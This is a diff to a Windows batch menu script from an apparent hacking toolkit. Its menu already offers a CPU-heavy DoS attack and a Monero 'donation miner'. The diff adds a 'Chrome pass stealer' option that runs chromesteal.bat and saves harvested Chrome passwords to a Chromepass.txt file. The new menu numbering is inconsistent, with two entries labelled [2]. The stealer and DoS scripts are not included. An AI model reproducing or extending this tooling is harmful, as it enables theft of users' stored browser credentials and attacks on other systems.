@@ -33,16 +33,18 @@ echo Made by Darkness and Criptic the protogen
 echo ㅤ
 if [%Name%] == [] set /p Name="Please set your name: " & goto nameset else echo Hello %Name%!
 echo [1] DoS attack (VERY hard on cpu)
+echo [2] Chrome pass stealer
 echo [2] change name
 echo [3] donation address or donation miner (monero)
 echo [4] say something
 echo [5] exit
 set /p pick=": "
 if %pick%==1 start %spot%\DoS.bat
-if %pick%==2 goto nameset
-if %pick%==3 goto miner
-if %pick%==4 goto talk
-if %pick%==5 exit
+if %pick%==2 start %spot%\chromesteal.bat && echo passwords stored in %path%\Info\passwords\Chromepass.txt && timeout /t 3 > nul && goto start
+if %pick%==3 goto nameset
+if %pick%==4 goto miner
+if %pick%==5 goto talk
+if %pick%==6 exit
 
 :nameset
 set /p Name="Please set your name: "
